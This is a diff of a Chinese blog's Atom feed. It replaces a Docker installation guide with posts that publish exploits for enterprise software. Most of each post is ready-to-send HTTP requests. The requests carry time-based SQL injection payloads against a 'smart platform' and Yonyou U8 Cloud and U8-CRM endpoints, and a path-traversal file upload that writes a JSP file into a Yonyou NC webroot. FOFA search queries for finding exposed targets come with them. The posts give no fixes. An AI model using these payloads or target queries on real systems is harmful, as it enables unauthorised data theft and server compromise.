@@ -3,31 +3,56 @@
     <id>http://example.com</id>
     <title>余香</title>
     <link href="http://example.com" />
-    <updated>2024-11-01T06:49:55.000Z</updated>
+    <updated>2024-11-05T08:02:29.000Z</updated>
     <entry>
-        <id>http://example.com/2024/11/01/docker%E5%AE%89%E8%A3%85/</id>
-        <title>docker安装</title>
-        <link rel="alternate" href="http://example.com/2024/11/01/docker%E5%AE%89%E8%A3%85/"/>
-        <content type="html">&lt;h1 id=&#34;docker安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker安装&#34;&gt;#&lt;/a&gt; docker 安装&lt;/h1&gt;
-&lt;h2 id=&#34;1-下载程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-下载程序&#34;&gt;#&lt;/a&gt; 1、下载程序&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://docs.docker.com/desktop/install/windows-install/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;下载 windows-x86_64 的即可。&lt;br&gt;
-下载完成后，别急着安装，电脑还需要打开一个功能。控制面板 -&amp;gt; 程序 -&amp;gt; 启动或关闭 Windows 功能开启红框中的功能，安装好后别着急重启，还有。。。&lt;br&gt;
-&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145059.png&#34; alt=&#34;20241101145059&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;安装wsl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装wsl&#34;&gt;#&lt;/a&gt; 安装 WSL&lt;/h2&gt;
-&lt;p&gt;以管理员模式打开 PowerShell 或 Windows 命令提示符，输入 wsl --install 命令具体操作如下：&lt;br&gt;
-键盘按下 win+r 键，按下 ctrl+shift + 回车。win 键就是 ctrl 右边的四个小方块。&lt;br&gt;
-&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145124.png&#34; alt=&#34;20241101145124&#34;&gt;&lt;br&gt;
- 输入：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wsl --install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101150049.png&#34; alt=&#34;20241101150049&#34;&gt;&lt;br&gt;
- 输入账号：&lt;br&gt;
-&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101150757.png&#34; alt=&#34;20241101150757&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;安装docker&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装docker&#34;&gt;#&lt;/a&gt; 安装 docker&lt;/h2&gt;
-&lt;p&gt;打开下载好的 docker 文件，点击 ok 开始自动安装。&lt;br&gt;
-&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145249.png&#34; alt=&#34;20241101145249&#34;&gt;&lt;br&gt;
- 安装成功&lt;br&gt;
-&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241101145340.png&#34; alt=&#34;20241101145340&#34;&gt;&lt;/p&gt;
+        <id>http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
+        <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
+        <link rel="alternate" href="http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;智慧平台sexcelexperrashx存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智慧平台sexcelexperrashx存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 智慧平台 SExcelExpErr.ashx 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;智慧平台 SExcelExpErr 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据敏感信息。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;body=&amp;quot;custom/blue/uimaker/easyui.css&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /ashx/KQ/SExcelExpErr.ashx?action=list&amp;amp;importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105160450.png&#34; alt=&#34;20241105160450&#34;&gt;&lt;/p&gt;
+</content>
+        <updated>2024-11-05T08:02:29.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2024/11/01/%E7%94%A8%E5%8F%8B%E6%BC%8F%E6%B4%9E/</id>
+        <title>用友U8系列漏洞</title>
+        <link rel="alternate" href="http://example.com/2024/11/01/%E7%94%A8%E5%8F%8B%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;用友u8-cloud系统businessrefaction存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-cloud系统businessrefaction存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-Cloud 系统 BusinessRefAction 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;用友 U8 Cloud BusinessRefAction 接口处存在 SQL 注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;title==&amp;quot;U8C&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&amp;amp;method=getTaskRepTreeRef&amp;amp;taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105153239.png&#34; alt=&#34;20241105153239&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友u8-crm系统接口attrlist存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-crm系统接口attrlist存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-CRM 系统接口 attrlist 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;fofa语句-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-2&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app=&amp;quot;用友U8CRM
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-2&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /devtools/tools/attrlist.php?DontCheckLogin=1&amp;amp;isquery=1 HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;obj_type=1&amp;#x27;;WAITFOR DELAY &amp;#x27;0:0:5&amp;#x27;--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-2&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105153358.png&#34; alt=&#34;20241105153358&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友nc系统filemanager接口存在任意文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友nc系统filemanager接口存在任意文件上传漏洞&#34;&gt;#&lt;/a&gt; 用友 NC 系统 FileManager 接口存在任意文件上传漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍-2&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;NC 系统可利用 /portal/pt/file/upload 接口中的 filename 参数及 billitem 参数实现任意文件上传，从而控制服务器&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-3&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app=&amp;quot;用友-UFIDA-NC&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-3&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /portal/pt/file/upload?pageId=login&amp;amp;filemanager=nc.uap.lfw.file.FileManager&amp;amp;iscover=true&amp;amp;billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;we.jsp&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%out.print(&amp;quot;hello world&amp;quot;);%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-3&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154248.png&#34; alt=&#34;20241105154248&#34;&gt;&lt;/p&gt;
 </content>
         <updated>2024-11-01T06:49:55.000Z</updated>
     </entry>
